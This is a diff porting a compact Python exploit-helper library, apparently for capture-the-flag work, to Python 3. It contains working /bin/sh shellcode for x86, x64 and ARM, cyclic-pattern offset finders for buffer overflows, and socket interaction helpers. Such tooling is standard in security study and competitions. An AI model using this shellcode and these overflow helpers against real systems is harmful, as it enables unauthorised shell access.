@@ -3,27 +3,40 @@ import os
 import re
 import struct
 import socket
+import codecs
 from telnetlib import Telnet
 from subprocess import Popen
 from threading import Thread, Event
 
 shellcode = {
-    'x86': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
-    'x64': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
-    'arm': '\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
+    'x86': b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
+    'x64': b'\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
+    'arm': b'\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
 }
 
-def p32(x):
-    return struct.pack('<I', x)
+def b(x):
+    return x if isinstance(x, bytes) else x.encode('latin1')
 
-def p64(x):
-    return struct.pack('<Q', x)
+def p32(n):
+    return struct.pack('<I', n)
+
+def p64(n):
+    return struct.pack('<Q', n)
 
 def u32(x):
-    return struct.unpack('<I', x)[0]
+    return struct.unpack('<I', b(x))[0]
 
 def u64(x):
-    return struct.unpack('<Q', x)[0]
+    return struct.unpack('<Q', b(x))[0]
+
+def xor(x, y):
+    return bytes(a ^ b for a, b in zip(b(x), b(y)))
+
+def encode(x, encoding):
+    return codecs.encode(b(x), encoding)
+
+def decode(x, encoding):
+    return codecs.decode(b(x), encoding)
 
 def pc(size=20280):
     s = ('ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz', '0123456789')
@@ -36,19 +49,17 @@ def po(x):
         x = p32(x) if x < (1<<32) else p64(x)
     return pc().index(x)
 
-def xor(x, y):
-    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(x, y))
-
 def proof_of_work(algorithm, hexdigest_prefix, prefix, length=64, badchars='\x0a'):
     import hashlib
     from itertools import product
 
     def builder(prefix):
         badpoints = map(ord, badchars)
-        characters = [chr(i) for i in xrange(256) if i not in badpoints]
+        characters = [chr(i) for i in range(256) if i not in badpoints]
         n = length - len(prefix)
         for x in product(characters, repeat=n):
-            yield prefix + ''.join(x)
+            s = prefix + ''.join(x)
+            yield s.encode('latin1')
 
     h = hashlib.new(algorithm)
     for x in builder(prefix):
@@ -97,24 +108,24 @@ def disconnect(s):
     s.shutdown(socket.SHUT_WR)
 
 def recvuntil(s, term):
-    buf = ''
-    while not buf.endswith(term):
+    buf = b''
+    while not buf.endswith(b(term)):
         buf += s.recv(1)
     return buf
 
 def expect(s, term):
-    buf = ''
+    buf = b''
     m = None
     while not m:
         buf += s.recv(1)
-        m = re.search(term, buf)
+        m = re.search(term, buf.decode('latin1'))
     return m
 
 def recvline(s):
-    return recvuntil(s, '\n')
+    return recvuntil(s, b'\n').decode('latin1')
 
 def sendline(s, buf):
-    s.sendall(buf+'\n')
+    s.sendall(b(buf)+b'\n')
 
 def interact(s):
     t = Telnet()
@@ -130,10 +141,10 @@ if __name__ == '__main__':
         subcommand = sys.argv[1]
         if subcommand == 'pc':
             size = int(sys.argv[2])
-            print pc(size)
+            print(pc(size))
         elif subcommand == 'po':
             value = sys.argv[2]
-            print po(value)
+            print(po(value))
     except IndexError:
-        print >>sys.stderr, "Usage: python %s (pc SIZE | po VALUE)" % sys.argv[0]
+        print("Usage: python {} (pc SIZE | po VALUE)".format(sys.argv[0]), file=sys.stderr)
         sys.exit(1)
